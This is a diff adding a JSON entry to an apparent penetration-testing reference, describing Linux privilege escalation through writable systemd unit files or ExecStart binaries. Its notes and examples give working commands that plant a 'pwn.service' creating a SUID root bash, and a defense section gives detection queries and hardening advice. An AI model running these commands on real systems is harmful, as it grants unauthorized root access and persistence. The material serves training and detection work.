@@ -1,0 +1,106 @@
+{
+  "id": "linux-systemd-privesc",
+  "name": "Writable systemd unit / relative ExecStart privesc",
+  "command": "systemctl start <unit>   # root runs attacker ExecStart from a writable unit",
+  "description": "systemd runs system services as root. If an unprivileged user can write a system-level .service or .timer unit file (world-writable unit, writable drop-in directory, or writable /etc/systemd/system), or if a unit's ExecStart points at a writable or relative binary path, the user sets ExecStart to their payload and starts/triggers the unit so systemd executes it as root. Also covers unit files reachable through a sudo systemctl grant.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Service and Scheduler Abuse",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "HackTricks / HTB Linux Privilege Escalation",
+  "tags": [
+    "systemd",
+    "service",
+    "timer",
+    "execstart",
+    "writable-unit",
+    "privesc"
+  ],
+  "mitre": [
+    "T1543.002",
+    "T1548"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT IT IS ===\n  System services run as root. Control over the unit file (or the binary it runs)\n  means control over a root process. Three common openings:\n    1. Writable unit file in /etc/systemd/system or /lib/systemd/system\n    2. Writable binary referenced by ExecStart (or a relative/missing path)\n    3. sudo systemctl ... granting start/enable of a unit you can influence\n\n=== ENUMERATE ===\n  # writable unit files:\n  find /etc/systemd/system /lib/systemd/system /run/systemd/system -writable -name '*.service' -o -writable -name '*.timer' 2>/dev/null\n  # writable ExecStart targets:\n  systemctl list-units --type=service\n  grep -r '^ExecStart=' /etc/systemd/system 2>/dev/null\n  # can you sudo systemctl?\n  sudo -l\n\n=== WRITABLE UNIT -> ROOT ===\n  cat > /etc/systemd/system/pwn.service <<'EOF'\n  [Unit]\n  Description=pwn\n  [Service]\n  Type=oneshot\n  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'\n  [Install]\n  WantedBy=multi-user.target\n  EOF\n  systemctl daemon-reload\n  systemctl start pwn.service\n  /tmp/rootbash -p          # uid=0\n\n=== WRITABLE ExecStart BINARY ===\n  # If ExecStart=/opt/app/run.sh and run.sh is writable, append your payload and\n  # wait for (or trigger) the service restart.\n\n=== WRITABLE .timer ===\n  # A writable .timer with OnCalendar/OnBootSec starting a unit you control runs it as root on schedule.\n\n=== ALTERNATIVES ===\n  cron-abuse-pspy (cron-based); sudo-abuse (sudo systemctl)",
+  "examples": [
+    {
+      "label": "Find writable system unit files",
+      "command": "find /etc/systemd/system /lib/systemd/system -writable \\( -name '*.service' -o -name '*.timer' \\) 2>/dev/null"
+    },
+    {
+      "label": "Drop a oneshot unit that makes a SUID bash",
+      "command": "printf '[Service]\\nType=oneshot\\nExecStart=/bin/bash -c \"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\"\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/pwn.service"
+    },
+    {
+      "label": "Reload, start, and use the SUID shell",
+      "command": "systemctl daemon-reload; systemctl start pwn.service; /tmp/rootbash -p"
+    }
+  ],
+  "references": [
+    {
+      "title": "HackTricks - systemd privesc",
+      "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd"
+    },
+    {
+      "title": "GTFOBins - systemctl",
+      "url": "https://gtfobins.github.io/gtfobins/systemctl/"
+    },
+    {
+      "title": "systemd.service man page",
+      "url": "https://www.freedesktop.org/software/systemd/man/systemd.service.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cron-abuse-pspy",
+      "note": "Scheduler-based root execution via cron, same idea as a .timer.",
+      "rel": "alternative"
+    },
+    {
+      "id": "sudo-abuse",
+      "note": "A sudo systemctl grant is a common way in.",
+      "rel": "prereq"
+    },
+    {
+      "id": "find-suid-sgid",
+      "note": "Pair with SUID enumeration when no writable unit exists.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "systemd starts system units as root from the service manager. If filesystem permissions let an unprivileged user modify a unit file, a drop-in, or the executable an ExecStart points to - or a sudo rule lets them control systemctl - they can make systemd run an attacker-chosen command with root privileges. A relative or unquoted ExecStart path can also be hijacked via a writable earlier directory.",
+    "prerequisites": "Write access to a system unit file / drop-in / its referenced binary, OR a sudo grant for systemctl start|enable|restart of an influenceable unit. daemon-reload (or a reboot/timer) to pick up changes.",
+    "impact": "Arbitrary command execution as root and persistence (an enabled unit survives reboot), from a single filesystem or sudoers misconfiguration.",
+    "detection": "[MITRE T1543.002] Creation or modification of files under /etc/systemd/system, /run/systemd/system or /lib/systemd/system by a non-root user; systemctl daemon-reload followed by start/enable of a new unit; root processes spawned by systemd whose ExecStart resides in a writable or non-standard path.",
+    "artifacts": "auditd watch hits on the systemd unit directories; journald records of a new/changed unit and its start; a unit with ExecStart in /tmp, /home or /opt writable paths; a SUID shell or reverse-shell child of systemd.",
+    "splunk_spl": "index=linux sourcetype=\"linux:auditd\" (name=\"/etc/systemd/system/*\" OR name=\"/run/systemd/system/*\") (syscall=open OR syscall=openat OR syscall=rename) a1=\"*O_WRONLY*\"\n| where auid!=0\n| table _time, host, auid, exe, name",
+    "elastic_kql": "event.category:file and file.path:(\\/etc\\/systemd\\/system\\/* or \\/run\\/systemd\\/system\\/*) and not user.name:root",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has \"systemd\" and SyslogMessage has_any (\"/etc/systemd/system\",\"daemon-reload\",\"ExecStart\")\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// non-root creating/modifying a system unit then starting it",
+    "sigma_rules": "lnx_systemd_unit_write_nonroot (non-root write to a system unit directory followed by start/enable)",
+    "prevention": "Ensure /etc/systemd/system, /lib/systemd/system and /run/systemd/system (and all unit files) are root-owned and not group/world-writable; use absolute, quoted ExecStart paths to root-owned binaries. Avoid sudo systemctl grants, or constrain them to specific read-only units. Audit unit directories with auditd and review on change.",
+    "sources": [
+      "https://book.hacktricks.xyz/linux-hardening/privilege-escalation",
+      "https://gtfobins.github.io/gtfobins/systemctl/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Non-root write to systemd unit directory then start",
+        "logic": "Syslog\n| where SyslogMessage has_any (\"/etc/systemd/system\",\"/run/systemd/system\")\n| where SyslogMessage has_any (\"daemon-reload\",\"systemctl start\",\"systemctl enable\",\"ExecStart\")\n| project TimeGenerated, Computer, SyslogMessage",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1543.002"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Package managers and configuration management (apt, dnf, Ansible, Puppet) legitimately install and reload units, but run as root.",
+        "tuning": "Restrict to writes by a non-root auid; alert when the new unit's ExecStart points into a writable path."
+      }
+    ]
+  }
+}
